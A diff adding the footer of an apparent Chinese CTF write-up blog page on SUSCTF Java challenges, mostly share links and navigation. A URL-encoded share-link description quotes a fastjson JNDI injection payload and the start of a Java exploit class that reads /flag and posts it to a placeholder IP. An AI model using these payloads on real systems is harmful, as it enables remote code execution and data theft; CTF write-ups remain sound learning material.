+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fbikeknight.top%2fposts%2fsusctf-java-solution%2f" aria-label="Facebook">
+      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fbikeknight.top%2fposts%2fsusctf-java-solution%2f&text=susctf%e5%9b%9b%e9%81%93Java%e9%a2%98%e8%a7%a3" aria-label="Twitter">
+      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fbikeknight.top%2fposts%2fsusctf-java-solution%2f&title=susctf%e5%9b%9b%e9%81%93Java%e9%a2%98%e8%a7%a3" aria-label="Linkedin">
+      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fbikeknight.top%2fposts%2fsusctf-java-solution%2f&is_video=false&description=susctf%e5%9b%9b%e9%81%93Java%e9%a2%98%e8%a7%a3" aria-label="Pinterest">
+      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=susctf%e5%9b%9b%e9%81%93Java%e9%a2%98%e8%a7%a3&body=Check out this article: https%3a%2f%2fbikeknight.top%2fposts%2fsusctf-java-solution%2f" aria-label="Email">
+      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fbikeknight.top%2fposts%2fsusctf-java-solution%2f&title=susctf%e5%9b%9b%e9%81%93Java%e9%a2%98%e8%a7%a3" aria-label="Pocket">
+      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fbikeknight.top%2fposts%2fsusctf-java-solution%2f&title=susctf%e5%9b%9b%e9%81%93Java%e9%a2%98%e8%a7%a3" aria-label="reddit">
+      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fbikeknight.top%2fposts%2fsusctf-java-solution%2f&name=susctf%e5%9b%9b%e9%81%93Java%e9%a2%98%e8%a7%a3&description=baby%20gadget%20v1.0%20%e7%99%bb%e5%bd%95%e6%a1%86%e6%b2%a1%e6%9c%89%e4%bb%80%e4%b9%88%e7%94%a8%ef%bc%8c%e6%89%ab%e7%9b%ae%e5%bd%95%e5%8f%af%e4%bb%a5%e5%be%97%e5%88%b0%e8%b7%af%e7%94%b1%20%2fadmin%20%ef%bc%8c%e6%96%b9%e6%b3%95%e4%bc%9a%e8%b7%b3%e8%bd%ac%e5%88%b0%20index.jsp%ef%bc%8c%e8%bf%99%e4%b8%aa%e8%b7%b3%e8%bd%ac%e6%98%af%e7%94%b1js%e6%8e%a7%e5%88%b6%e7%9a%84%ef%bc%8c%e5%8f%af%e4%bb%a5%e6%8a%8a%e6%b5%8f%e8%a7%88%e5%99%a8js%e7%a6%81%e7%94%a8%e6%8e%89%ef%bc%8c%e7%9b%b4%e6%8e%a5%e8%ae%bf%e9%97%ae%20%2fadmin%20%ef%bc%8c%e7%84%b6%e5%90%8e%e5%8f%af%e4%bb%a5%e4%b8%8b%e8%bd%bd%e5%be%97%e5%88%b0%e4%be%9d%e8%b5%96%20lib%ef%bc%9a%0a%20commons-lang.jar%20fastjson-1.2.48.jar%20flex-messaging-core.jar%20quartz.jar%20%20%e5%9c%a8%20%2fadmin%2fmaibox.jsp%20%e4%b8%8b%e6%9c%89%e4%b8%80%e4%b8%aa%e8%be%93%e5%85%a5%e6%a1%86%ef%bc%8c%e7%8c%9c%e6%b5%8b%e6%98%af%e7%94%a8%e6%9d%a5%e8%a7%a3%e6%9e%90json%e6%95%b0%e6%8d%ae%e7%9a%84%ef%bc%8c%e4%bd%86%e6%98%af%e6%80%8e%e4%b9%88%e6%89%93DNSLOG%e9%83%bd%e6%b2%a1%e6%9c%89%e5%8f%8d%e5%ba%94%ef%bc%8c%e6%8e%a5%e7%9d%80%e9%99%b7%e5%85%a5%e4%ba%86%e4%b8%80%e5%a4%a9%e5%9c%a8%e7%bb%99%e7%9a%84lib%e9%87%8c%e6%89%begadget%e7%9a%84%e8%bf%87%e7%a8%8b%ef%bc%8c%e6%af%ab%e6%97%a0%e6%94%b6%e8%8e%b7%e3%80%82%0a%e7%ac%ac%e4%ba%8c%e5%a4%a9%e7%bb%8f%e8%bf%87%e9%98%9f%e5%8f%8b%40Siebene%e7%9a%84%e6%8f%90%e9%86%92%ef%bc%8c%e5%8f%91%e7%8e%b0%e4%b8%8b%e9%9d%a2%e8%bf%99%e6%9d%a1payload%ef%bc%8c%e6%9c%8d%e5%8a%a1%e5%99%a8%e7%9b%91%e5%90%ac%e7%9a%84nc%e5%8f%af%e4%bb%a5%e6%94%b6%e5%88%b0%e8%af%b7%e6%b1%82%e6%95%b0%e6%8d%ae%ef%bc%9a%0a%7b%26%2334%3b%40type%26%2334%3b%3a%26%2334%3borg.apache.xbean.propertyeditor.JndiConverter%26%2334%3b%2c%26%2334%3bAsText%26%2334%3b%3a%26%2334%3bldap%3a%2f%2fIP%3aPORT%2fExploit%26%2334%3b%7d%20JNDI%e6%b3%a8%e5%85%a5%ef%bc%8c%e8%bf%9c%e7%a8%8b%e5%8f%af%e4%bb%a5%e6%94%b6%e5%88%b0ldap%e5%92%8chttp%e8%af%b7%e6%b1%82%ef%bc%8c%e4%bd%86%e6%98%af%e6%81%b6%e6%84%8f%e5%ad%97%e8%8a%82%e7%a0%81%e4%b8%ad%e7%9a%84%e5%91%bd%e4%bb%a4%e6%97%a0%e6%b3%95%e8%a2%ab%e6%89%a7%e8%a1%8c%ef%bc%8c%e8%bf%99%e6%97%b6%e5%80%99%e8%bd%ac%e5%8f%98%e4%ba%86%e4%b8%80%e4%b8%8b%e6%80%9d%e8%b7%af%ef%bc%8c%e5%b0%9d%e8%af%95%e5%90%91%e8%bf%9c%e7%a8%8b%e5%8f%91%e8%b5%b7HTTP%e8%af%b7%e6%b1%82%ef%bc%8c%e6%8a%8a%e8%a6%81%e8%af%bb%e5%8f%96%e7%9a%84%e6%96%87%e4%bb%b6%e5%b8%a6%e5%88%b0body%e4%b8%ad%ef%bc%8c%e6%81%b6%e6%84%8f%e5%ad%97%e8%8a%82%e7%a0%81%e5%a6%82%e4%b8%8b%ef%bc%9a%0aimport%20java.io.FileInputStream%3b%20import%20java.io.OutputStream%3b%20import%20java.net.HttpURLConnection%3b%20import%20java.net.URL%3b%20import%20java.io.OutputStreamWriter%3b%20%20%20public%20class%20Exploit%20%7b%20%20public%20Exploit%28%29%20%7b%20%20%7d%20%20%20static%20%7b%20%20try%20%7b%20%20byte%5b%5d%20bytes%20%3d%20new%20byte%5b2048%5d%3b%20%20FileInputStream%20fis%20%3d%20new%20FileInputStream%28%26%2334%3b%2fflag%26%2334%3b%29%3b%20%20fis.read%28bytes%29%3b%20%20%20URL%20url%20%3d%20new%20URL%28%26%2334%3bhttp%3a%2f%2fIP%3a6666%2fFoo%26%2334%3b%29%3b%20%20HttpURLConnection%20connection%20%3d%20%28HttpURLConnection%29%20url." aria-label="Tumblr">
+      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fbikeknight.top%2fposts%2fsusctf-java-solution%2f&t=susctf%e5%9b%9b%e9%81%93Java%e9%a2%98%e8%a7%a3" aria-label="Hacker News">
+      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      
+        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
+          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
+          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
+          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+
+  <footer id="footer">
+  <div class="footer-left">
+    Copyright  &copy; 2022  Hello World 
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+        <li><a href="/">Home</a></li>
+         
+        <li><a href="/posts">All posts</a></li>
+         
+        <li><a href="/tags">Tags</a></li>
+         
+        <li><a href="/about">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+  </div>
+</body>
+
+<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
+<script src=/lib/jquery/jquery.min.js></script>
+<script src=/js/main.js></script>
+
+<script src=/js/code-copy.js></script>
+
+
+
+  
+
+
+<script>
+  MathJax = {
+    tex: {
+      inlineMath: [['$', '$'], ['\\(', '\\)']]
+    },
+    svg: {
+      fontCache: 'global'
+    }
+  };
+</script>
+<script type="text/javascript" id="MathJax-script" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
+</script>
+
+</html>
